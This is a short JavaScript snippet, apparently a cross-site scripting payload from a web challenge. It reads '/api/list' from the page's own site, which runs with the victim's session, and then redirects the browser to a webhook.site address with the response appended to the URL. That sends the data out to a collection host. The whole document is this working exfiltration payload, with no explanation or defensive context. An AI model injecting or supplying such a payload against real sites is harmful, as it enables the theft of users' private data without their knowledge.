fetch('/api/list').then(r=>r.text())
        .then(r=>location = "https://webhook.site/6267faf3-98e5-436e-905a-0929f779a585/meow?c="+r)
